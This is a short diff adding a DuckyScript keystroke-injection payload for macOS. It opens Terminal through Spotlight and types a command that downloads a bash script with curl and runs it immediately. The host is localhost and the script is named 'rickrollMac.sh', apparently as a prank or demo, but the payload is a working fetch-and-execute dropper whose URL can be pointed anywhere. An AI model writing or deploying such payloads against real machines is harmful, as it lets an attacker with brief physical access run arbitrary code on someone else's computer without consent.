@@ -1,0 +1,10 @@
+REM Open terminal
+COMMAND SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+
+REM Run the bash script from a remote server
+STRING bash -c "$(curl -fsSL http://localhost:3002/rickrollMac.sh)"
+ENTER
